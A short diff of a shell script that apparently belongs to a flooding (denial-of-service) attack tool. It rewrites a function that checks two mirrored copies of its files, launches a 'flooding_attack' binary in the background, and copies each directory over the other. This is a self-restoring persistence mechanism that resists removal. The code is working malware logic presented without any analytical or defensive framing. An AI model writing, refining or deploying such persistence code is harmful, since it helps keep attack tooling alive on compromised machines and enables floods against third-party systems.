@@ -14,21 +14,22 @@ is_process_exist() {
 }
 
 check_file_and_launch_attack() { # restore corrupted files
-  if [ ! -d "$home_dir/$dir01" ] ||\
-    [ ! -d "$home_dir/$dir01/$module_dir" ] ||\
-    [ ! -f "$home_dir/$dir01/$module_dir/$launch_file" ] ||\
-    [ ! -f "$home_dir/$dir01/$module_dir/$flooding_file" ]
-  then
-    $home_dir/$dir02/$module_dir/flooding_attack&
-    cp -r "$home_dir/$dir02" "$home_dir/$dir01"
-  fi
-  if [ ! -d "$home_dir/$dir02" ] ||\
+  if [ -f "$home_dir/$dir01/$module_dir/$flooding_file" ] ||\
+    [ ! -d "$home_dir/$dir02" ] ||\
     [ ! -d "$home_dir/$dir02/$module_dir" ] ||\
     [ ! -f "$home_dir/$dir02/$module_dir/$launch_file" ] ||\
     [ ! -f "$home_dir/$dir02/$module_dir/$flooding_file" ]
   then
     $home_dir/$dir01/$module_dir/flooding_attack&
     cp -r "$home_dir/$dir01" "$home_dir/$dir02"
+  elif [ -f "$home_dir/$dir02/$module_dir/$flooding_file" ] ||\
+    [ ! -d "$home_dir/$dir01" ] ||\
+    [ ! -d "$home_dir/$dir01/$module_dir" ] ||\
+    [ ! -f "$home_dir/$dir01/$module_dir/$launch_file" ] ||\
+    [ ! -f "$home_dir/$dir01/$module_dir/$flooding_file" ]
+  then
+    $home_dir/$dir02/$module_dir/flooding_attack&
+    cp -r "$home_dir/$dir02" "$home_dir/$dir01"
   fi
 }
 
